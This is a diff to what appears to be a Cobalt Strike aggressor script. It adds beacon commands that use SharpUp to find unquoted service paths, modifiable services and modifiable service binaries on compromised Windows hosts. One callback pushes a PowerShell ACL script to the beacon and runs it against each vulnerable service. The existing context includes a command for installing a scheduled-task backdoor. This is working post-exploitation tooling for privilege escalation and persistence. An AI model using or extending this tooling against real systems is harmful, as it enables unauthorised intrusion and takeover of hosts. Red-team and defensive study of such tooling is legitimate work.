@@ -10,6 +10,8 @@ $RUBEUS_PATH        = getFileProper("C:\\Tools\\Rubeus\\Rubeus\\bin\\Release","R
 $SEATBELT_PATH      = getFileProper("C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release","Seatbelt.exe");
 $ADSEARCH_PATH      = getFileProper("C:\\Tools\\ADSearch\\ADSearch\\bin\\Release","ADSearch.exe");
 $SHAREPERSIST_PATH  = getFileProper("C:\\Tools\\SharPersist\\SharPersist\\bin\\Release","SharPersist.exe");
+$SHARPUP_PATH       = getFileProper("C:\\Tools\\SharpUp\\SharpUp\\bin\\Release","SharpUp.exe");
+$GETSERVICEACL_PATH = getFileProper("c:\\Tools","Get-ServiceAcl.ps1");
 
 #TEST FUNCTION
 command beacons {
@@ -300,4 +302,66 @@ beacon_command_register(
     "sharpersist_schtask",
     "Install a backdoor in scheduled task",
     "Usage: sharpersist_schtask [powershell commands]"
+);
+
+#PRIVILEGE ESCALATION HELPERS
+##UNQUOTED SERVICE PATHS
+alias privesc_unquotedpath {
+    bexecute_assembly($1, $SHARPUP_PATH, "audit UnquotedServicePath");
+}
+beacon_command_register(
+    "privesc_unquotedpath",
+    "Checkes Unquoted Paths",
+    "Uses SharpUp to check for unquoted service paths"
+);
+
+##WEAK SERVICE PERMS
+sub privesc_weaksvcperms_cb {
+    #Arguments: $1 = beacon ID, $2 = results, $3 = information map
+    local('$regx_service $service $script $oneliner');
+    
+    $regx_service = '\sService \'(\w+)\'';
+    
+    $services = matches($2, $regx_service);
+    
+    blog($1, $2);
+
+    foreach $service ($services) {
+        blog($1, "Vulnerable Services: ". $service);
+
+        #import the script
+        $handle = openf($GETSERVICEACL_PATH);
+        $script = readb($handle, -1);
+        closef($handle);
+
+        #send script to beacon
+        $oneliner = beacon_host_script($1, $script);
+
+        bpowerpick($1, "get-serviceacl -name " . $service . " | select -expand Access", $oneliner);
+
+    }
+}
+alias privesc_weaksvcperms {
+    bexecute_assembly($1, $SHARPUP_PATH, "audit ModifiableServices", $null, &privesc_weaksvcperms_cb);
+}
+beacon_command_register(
+    "privesc_weaksvcperms",
+    "Checkes for weak service permissions",
+    "Uses SharpUp to check for weak service permissions"
+);
+
+##WEAK SERVICE BINARY PERMS
+sub privesc_weaksvcbinaryperms_cb {
+    blog($1, $2);
+    blog($1, "Use 'powerpick get-acl -Path <binpath> | fl' to check permissions");
+    
+}
+
+alias privesc_weaksvcbinaryperms {
+    bexecute_assembly($1, $SHARPUP_PATH, "audit ModifiableServiceBinaries", $null, &privesc_weaksvcbinaryperms_cb);
+}
+beacon_command_register(
+    "privesc_weaksvcbinaryperms",
+    "Checkes for weak service binary permissions",
+    "Uses SharpUp to check for weak service binary permissions"
 );
